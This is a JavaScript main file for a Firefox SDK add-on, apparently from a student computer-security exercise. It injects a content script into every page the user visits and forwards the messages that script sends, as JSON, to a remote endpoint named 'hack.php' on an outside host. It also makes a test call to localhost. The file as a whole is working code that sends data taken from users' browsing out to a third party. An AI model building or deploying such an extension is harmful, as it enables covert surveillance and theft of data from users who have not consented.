var pageMod = require("sdk/page-mod");
var self = require("sdk/self");
var request = require("sdk/request").Request;
 
 pageMod.PageMod({
       include: "*",
         contentScriptFile: [self.data.url("jquery-2.0.3.min.js"), self.data.url("my-content-script.js")],
         onAttach: function(worker){
             worker.port.on("message", function(message) {
                 var jsonmsg = JSON.parse(message);
    
    var testReq = request ({
        url: 'http://athena.nitc.ac.in/~john_bcs10/comp_sec/hack.php',
        content: jsonmsg,
        contentType:'application/json',
        onComplete: function(response) {
        console.log(response.text);
    }
    }).get();        

             });
         }
         
 });

var testReq = request ({
    url: "http://localhost/test.php",
    onComplete: function(response) {
        console.log(response.text);
    }
}).get();


